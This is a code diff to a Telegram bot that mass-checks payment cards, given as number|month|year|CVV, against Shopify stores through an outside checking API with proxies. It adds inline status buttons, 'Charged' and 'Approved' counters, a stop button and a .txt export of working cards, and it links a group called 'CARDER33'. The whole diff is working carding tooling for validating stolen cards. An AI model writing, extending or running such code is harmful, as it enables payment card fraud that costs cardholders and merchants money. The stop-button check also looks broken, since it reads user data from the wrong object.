@@ -5327,13 +5327,15 @@ async def msite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 
-# ===== Shopify check request =====
+# ===== Shopify check request with Buttons + TXT Export =====
 import asyncio
 import httpx
 import time
+import re
+import io
 from html import escape
-from telegram import Update
-from telegram.ext import ContextTypes
+from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton, InputFile
+from telegram.ext import ContextTypes, CallbackQueryHandler
 
 from db import get_user, update_user
 
@@ -5341,7 +5343,6 @@ from db import get_user, update_user
 last_msp_usage = {}
 
 # Regex to extract cards
-import re
 CARD_REGEX = re.compile(r"\d{12,19}\|\d{2}\|\d{2,4}\|\d{3,4}")
 
 # Consume credit
@@ -5352,19 +5353,14 @@ async def consume_credit(user_id: int) -> bool:
         return True
     return False
 
-import asyncio
-import httpx
-from telegram import Update
-from html import escape
 
 # ===== Shopify check request =====
 async def check_card(session: httpx.AsyncClient, base_url: str, site: str, card: str, proxy: str):
-    # Ensure HTTPS
     if not site.startswith("http://") and not site.startswith("https://"):
         site = "https://" + site
     url = f"{base_url}?site={site}&cc={card}&proxy={proxy}"
     try:
-        r = await session.get(url, timeout=55)  # ✅ 55s timeout
+        r = await session.get(url, timeout=55)
         data = r.json()
         return (
             data.get("Response", "Unknown"),
@@ -5375,15 +5371,47 @@ async def check_card(session: httpx.AsyncClient, base_url: str, site: str, card:
     except Exception as e:
         return f"Error: {str(e)}", "false", "0", "N/A"
 
+
+# ===== Inline Buttons =====
+def build_buttons(current_card, approved, charged, declined, owner_id):
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton(f"💳 Card: {current_card}", callback_data="noop")],
+        [
+            InlineKeyboardButton(f"✅ Approved: {approved}", callback_data="noop"),
+            InlineKeyboardButton(f"🔥 Charged: {charged}", callback_data="noop"),
+        ],
+        [
+            InlineKeyboardButton(f"❌ Declined: {declined}", callback_data="noop"),
+            InlineKeyboardButton("⏹ Stop", callback_data=f"stop:{owner_id}")
+        ]
+    ])
+
+
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    data = query.data
+
+    if data.startswith("stop:"):
+        owner_id = int(data.split(":")[1])
+        if query.from_user.id != owner_id:
+            return await query.answer("⚠️ Not your request!", show_alert=True)
+        context.user_data["msp_stop"] = True
+        return await query.answer("⏹ Process stopped!", show_alert=True)
+
+    return await query.answer()
+
+
 # ===== Background runner =====
 async def run_msp(update: Update, cards, base_url, sites, msg):
-    approved = declined = errors = checked = 0
+    approved = declined = errors = charged = checked = 0
     site_price = None
     gateway_used = "Self Shopify"
-    results = []
+    results = []  # List of lines for Telegram updates
+    file_results = []  # Detailed for txt export
 
-    sem = asyncio.Semaphore(5)  # Moderate concurrency
-    lock = asyncio.Lock()  # Priority map
+    sem = asyncio.Semaphore(5)
+    lock = asyncio.Lock()
 
     PRIORITY = {
         "ORDER_PLACED": 4,
@@ -5423,7 +5451,6 @@ async def run_msp(update: Update, cards, base_url, sites, msg):
             if gateway and gateway != "N/A":
                 gateway_used = gateway
 
-            # Determine score
             score = 0
             for key, val in PRIORITY.items():
                 if key in resp_upper:
@@ -5432,13 +5459,11 @@ async def run_msp(update: Update, cards, base_url, sites, msg):
             return resp_str, score
 
         async def worker(card):
-            nonlocal approved, declined, errors, checked, results
+            nonlocal approved, declined, errors, charged, checked, results, file_results
             async with sem:
-                # Check card on all sites concurrently
                 tasks = [check_one(card, site) for site in sites]
                 responses = await asyncio.gather(*tasks, return_exceptions=True)
 
-                # Pick best response
                 best_resp, best_score = "Unknown", 0
                 for r in responses:
                     if isinstance(r, Exception):
@@ -5448,29 +5473,33 @@ async def run_msp(update: Update, cards, base_url, sites, msg):
                     if score > best_score:
                         best_resp, best_score = resp_str, score
 
-                # Classification
                 if best_score >= 4:
+                    charged += 1
                     approved += 1
                     status_icon = "✅"
-                    display_resp = f"{escape(best_resp)} ▸𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
+                    display_resp = f"{best_resp} ▸𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
                 elif best_score == 3:
                     approved += 1
                     status_icon = "✅"
-                    display_resp = f"{escape(best_resp)} 🔒"
+                    display_resp = f"{best_resp} 🔒"
                 elif best_score == 2:
                     declined += 1
                     status_icon = "❌"
-                    display_resp = escape(best_resp)
+                    display_resp = best_resp
                 else:
                     errors += 1
                     status_icon = "⚠️"
-                    display_resp = escape(best_resp)
+                    display_resp = best_resp
 
                 checked += 1
-                result_line = f"{status_icon} <code>{escape(card)}</code>\n ↳ <i>{display_resp}</i>"
+
+                # For telegram updates (short)
+                result_line = f"{status_icon} <code>{escape(card)}</code>\n ↳ <i>{escape(display_resp)}</i>"
                 results.append(result_line)
 
-                # Update summary in Telegram
+                # For file export (detailed)
+                file_results.append(f"{card}\n    {best_resp}\n")
+
                 async with lock:
                     summary_text = (
                         "<pre><code>"
@@ -5478,6 +5507,7 @@ async def run_msp(update: Update, cards, base_url, sites, msg):
                         f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                         f"🌍 Total Cards : {len(cards)}\n"
                         f"✅ Approved : {approved}\n"
+                        f"🔥 Charged : {charged}\n"
                         f"❌ Declined : {declined}\n"
                         f"⚠️ Errors : {errors}\n"
                         f"🔄 Checked : {checked} / {len(cards)}\n"
@@ -5488,32 +5518,55 @@ async def run_msp(update: Update, cards, base_url, sites, msg):
                         f"────────────────\n"
                     )
 
-                    # Only show last 20 results
-                    final_text = summary_text + "\n".join(results[-20:])
+                    buttons = build_buttons(card, approved, charged, declined, update.effective_user.id)
+                    final_text = summary_text + "\n".join(results[-10:])
                     try:
-                        await msg.edit_text(final_text, parse_mode="HTML", disable_web_page_preview=True)
+                        await msg.edit_text(
+                            final_text,
+                            parse_mode="HTML",
+                            disable_web_page_preview=True,
+                            reply_markup=buttons
+                        )
                     except:
                         pass
-                await asyncio.sleep(0.1)  # Small delay to avoid flooding
 
-        # Run all cards sequentially (each card checks all sites concurrently)
+                await asyncio.sleep(0.1)
+
         for card in cards:
+            if update.effective_user.id in update.user_data and update.user_data.get("msp_stop"):
+                break
             await worker(card)
+
+    # Delete the summary msg
+    try:
+        await msg.delete()
+    except:
+        pass
+
+    # Send all results in .txt (card + response under it)
+    final_report = "\n".join(file_results)
+    file = io.BytesIO(final_report.encode("utf-8"))
+    file.name = "shopify_results.txt"
+
+    await update.message.reply_document(
+        document=InputFile(file),
+        filename="shopify_results.txt",
+        caption="📄 Final Results"
+    )
+
 
 # ===== /msp command =====
 BULLET_GROUP_LINK = "https://t.me/CARDER33"
-last_msp_usage = {}  # Track user cooldowns
+last_msp_usage = {}
 
 async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     now = time.time()
 
-    # Cooldown check (5 seconds)
     if user_id in last_msp_usage and now - last_msp_usage[user_id] < 5:
         return await update.message.reply_text("⏳ Please wait 5 seconds before using /msp again.")
     last_msp_usage[user_id] = now
 
-    # Extract input text from args or replied message
     raw_input = None
     if context.args:
         raw_input = " ".join(context.args)
@@ -5524,17 +5577,15 @@ async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return await update.message.reply_text(
             "Usage:\n<code>/msp card|mm|yy|cvv card2|mm|yy|cvv ...</code>\n"
             "Or reply to a message containing cards.",
-            parse_mode=ParseMode.HTML
+            parse_mode="HTML"
         )
 
-    # Extract cards using regex (make sure CARD_REGEX is defined)
     cards = [m.group(0) for m in CARD_REGEX.finditer(raw_input)]
     if not cards:
         return await update.message.reply_text("❌ No valid cards found.")
     if len(cards) > 50:
         cards = cards[:50]
 
-    # Fetch user data and credits
     user_data = await get_user(user_id)
     if not user_data:
         return await update.message.reply_text("❌ No user data found in DB.")
@@ -5546,25 +5597,35 @@ async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not sites:
         return await update.message.reply_text("❌ No sites found in your account.")
 
-    # Build bullet link HTML
-    bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'
-
-    # Compose processing message
-    processing_text = (
-        f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
-        f"<pre><code>𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸 𝗢𝗻𝗴𝗼𝗶𝗻𝗴</code></pre>\n"
-        f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝑨𝒖𝒕𝒐𝒔𝒉𝒐𝒑𝐢𝐟𝐲\n"
+    # Initial summary msg
+    initial_summary = (
+        "<pre><code>"
+        f"📊 𝐌𝐚𝐬𝐬 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝐂𝐡𝐞𝐜𝐤𝐞𝐫\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🌍 Total Cards : {len(cards)}\n"
+        f"✅ Approved : 0\n"
+        f"🔥 Charged : 0\n"
+        f"❌ Declined : 0\n"
+        f"⚠️ Errors : 0\n"
+        f"🔄 Checked : 0 / {len(cards)}\n"
+        f"🏬 Gateway : AutoShopify\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "</code></pre>\n"
+        "#AutoshopifyChecks\n"
+        "────────────────\n"
     )
+    buttons = build_buttons("Waiting…", 0, 0, 0, update.effective_user.id)
 
-    # Send fancy processing message
     msg = await update.message.reply_text(
-        processing_text,
-        parse_mode=ParseMode.HTML,
-        disable_web_page_preview=True
+        initial_summary,
+        parse_mode="HTML",
+        disable_web_page_preview=True,
+        reply_markup=buttons
     )
 
-    # Start background task
     asyncio.create_task(run_msp(update, cards, base_url, sites, msg))
+
+
 
 
 
@@ -7566,6 +7627,7 @@ def main():
     # Pagination handler - added only once
     application.add_handler(CallbackQueryHandler(cmds_pagination, pattern="^page_"))
     application.add_handler(CallbackQueryHandler(handle_close, pattern="^close$"))
+    application.add_handler(CallbackQueryHandler(button_handler))
 
     # Other generic callbacks
     application.add_handler(CallbackQueryHandler(check_joined_callback, pattern="^check_joined$"))
